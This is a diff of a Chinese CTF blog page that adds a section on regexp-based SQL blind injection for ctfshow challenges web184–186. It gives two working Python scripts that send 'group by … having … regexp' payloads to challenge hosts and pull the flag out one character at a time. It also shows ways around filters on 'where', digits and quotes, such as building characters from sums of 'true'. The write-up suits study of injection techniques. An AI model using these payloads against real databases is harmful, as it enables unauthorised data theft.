@@ -63,7 +63,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article" style="position: absolute; top: 40px; z-index: 2;">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8"><span class="toc-text">SQL盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#like%E7%9B%B2%E6%B3%A8"><span class="toc-text">like盲注</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8"><span class="toc-text">SQL盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#like%E7%9B%B2%E6%B3%A8"><span class="toc-text">like盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#regexp%E7%9B%B2%E6%B3%A8"><span class="toc-text">regexp盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="toc-text">无数字引号盲注</span></a></li></ol></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -78,6 +78,7 @@
                 <div id="loading-circle">
                     <h2>LOADING</h2>
                     <p>第一次加载可能会花费较长时间，请耐心等待</p>
+                    <p>要不挂个梯子试试？（x</p>
                     <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                     <img src="/blog/images/loading.gif" />
                 </div>
@@ -220,7 +221,7 @@
 <span id="more"></span>
 
 <h1 id="like盲注"><a href="#like盲注" class="headerlink" title="like盲注"></a>like盲注</h1><blockquote>
-<p>返回用户表的记录总数时，使用like和%通配符爆破flag字段</p>
+<p>返回用户表的记录总数时，使用<code>like</code>和<code>%通配符</code>爆破flag字段</p>
 </blockquote>
 <p>以ctfshow web183为例</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//拼接sql语句查找指定ID用户</span>
@@ -254,6 +255,102 @@ count <span class="token operator">=</span> <span class="token number">0</span>
 
 
 
+
+<h1 id="regexp盲注"><a href="#regexp盲注" class="headerlink" title="regexp盲注"></a>regexp盲注</h1><blockquote>
+<p>过滤where时，可使用<code>group by+ having + regexp</code>的方式进行注入</p>
+</blockquote>
+<p>以ctfshow web184为例</p>
+<p>输入与返回大致与上文的like盲注相同</p>
+<p>过滤了where</p>
+<p>脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+
+url <span class="token operator">=</span> <span class="token string">'http://7611653d-42d4-474d-a57a-14af8133bd46.challenge.ctf.show/select-waf.php'</span>
+uuid <span class="token operator">=</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> <span class="token string">"-&#125;"</span>
+passwd <span class="token operator">=</span> <span class="token string">'ctfshow_user group by pass having pass regexp(0x63746673686f777b'</span>  <span class="token comment">#ctfshow&#123;</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> char <span class="token keyword">in</span> uuid<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'tableName'</span><span class="token punctuation">:</span> passwd <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token format-spec">]</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">&#125;</span> <span class="token comment"># 因为要拼接进前面的十六进制字符串中，所以这里从第二个开始截(去掉0x)</span>
+        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            passwd <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="无数字引号盲注"><a href="#无数字引号盲注" class="headerlink" title="无数字引号盲注"></a>无数字引号盲注</h2><blockquote>
+<p>过滤数字和引号时，可用<code>regexp(concat(char(xxx),char(xxx)...))</code></p>
+</blockquote>
+<p>以ctfshow web185 186为例</p>
+<p>该表格为可代替数字的基础表达式，要获得更多数字就对下列值进行加减乘除即可</p>
+<table>
+<thead>
+<tr>
+<th>expression</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>false</td>
+<td>0</td>
+</tr>
+<tr>
+<td>true</td>
+<td>1</td>
+</tr>
+<tr>
+<td>true+true</td>
+<td>2</td>
+</tr>
+<tr>
+<td>floor(pi())</td>
+<td>3</td>
+</tr>
+<tr>
+<td>ceil(pi())</td>
+<td>4</td>
+</tr>
+</tbody></table>
+<p>脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Kradress</span>
+<span class="token keyword">from</span> operator <span class="token keyword">import</span> concat
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+
+url <span class="token operator">=</span> <span class="token string">'http://6717f27a-2912-48e6-927d-d025d0418954.challenge.ctf.show/select-waf.php'</span>
+uuid <span class="token operator">=</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> <span class="token string">"-&#125;"</span>
+passwd <span class="token operator">=</span> <span class="token string">'ctfshow_user group by pass having pass regexp('</span>  <span class="token comment">#ctfshow&#123;</span>
+flag <span class="token operator">=</span> <span class="token string">'ctfshow&#123;'</span>
+
+
+<span class="token keyword">def</span> <span class="token function">numToStr1</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 使用concat连接字符得到字符串</span>
+    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> s <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+        parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span>numToStr2<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    res <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"concat(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>
+
+
+<span class="token keyword">def</span> <span class="token function">numToStr2</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 获取字符转换为ASCll码值为n并用n个true代替</span>
+    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    n <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span>
+    res <span class="token operator">=</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> char <span class="token keyword">in</span> uuid<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'tableName'</span><span class="token punctuation">:</span> passwd <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>numToStr1<span class="token punctuation">(</span>flag<span class="token operator">+</span>char<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">&#125;</span>
+        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            flag <span class="token operator">+=</span> char
+            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
     </div>
